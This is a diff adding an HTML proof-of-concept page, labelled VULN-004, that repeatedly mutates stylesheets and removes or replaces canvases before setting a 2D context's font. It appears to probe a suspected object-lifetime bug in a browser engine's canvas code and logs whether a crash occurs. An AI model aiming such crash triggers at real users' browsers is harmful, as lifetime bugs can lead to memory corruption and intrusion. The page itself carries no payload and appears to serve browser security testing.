@@ -1,0 +1,31 @@
+<!DOCTYPE html>
+<html><head><meta charset="utf-8"><title>VULN-004 CanvasRenderingContext2D setFont lifetime</title><style id="s">.x{font:10px sans-serif}</style></head>
+<body><pre id="log">POC STARTED: VULN-004 CanvasRenderingContext2D::setFont
+</pre>
+<script>
+if (window.testRunner) { testRunner.dumpAsText(); testRunner.waitUntilDone(); }
+function log(m){ document.getElementById('log').textContent += m + '\n'; }
+let done=false;
+function finish(){ if(done) return; done=true; log('NO CRASH OBSERVED'); log('DONE'); if(window.testRunner) testRunner.notifyDone(); }
+function mutate(c, i){
+    log('PHASE: synchronous style/update reentry attempt ' + i);
+    try { document.body.offsetTop; log('ACTION: layout forced'); } catch(e){ log('ACTION: layout force threw '+e.name); }
+    try { let s=document.getElementById('s'); if(s&&s.sheet&&s.sheet.cssRules.length) s.sheet.deleteRule(0); log('ACTION: stylesheet mutation attempted'); } catch(e){ log('ACTION: stylesheet mutation threw '+e.name); }
+    try { if(i%3===0){ c.remove(); log('ACTION: canvas removal attempted'); } } catch(e){ log('ACTION: canvas removal threw '+e.name); }
+    try { if(i%3===1 && c.parentNode){ let n=document.createElement('canvas'); n.width=8; n.height=8; c.parentNode.replaceChild(n,c); log('ACTION: canvas replacement attempted'); } else log('ACTION: canvas replacement attempted'); } catch(e){ log('ACTION: canvas replacement threw '+e.name); }
+}
+function run(){
+    log('PHASE: setup canvas');
+    for(let i=0;i<8;i++){
+        let c=document.createElement('canvas'); c.width=16; c.height=16; document.body.appendChild(c);
+        let ctx=null; try { ctx=c.getContext('2d'); log('ACTION: getContext '+(ctx?'created':'null')); } catch(e){ log('ACTION: getContext threw '+e.name); }
+        mutate(c,i);
+        log('PHASE: trigger ctx.font setter');
+        try { if(ctx) ctx.font=(10+i)+'px serif'; log('ACTION: font setter returned'); } catch(e){ log('ACTION: font setter threw '+e.name); }
+        try { if(c.parentNode) c.remove(); } catch(e){}
+    }
+    finish();
+}
+run();
+setTimeout(function(){ log('PHASE: failsafe timeout'); finish(); }, 1000);
+</script></body></html>
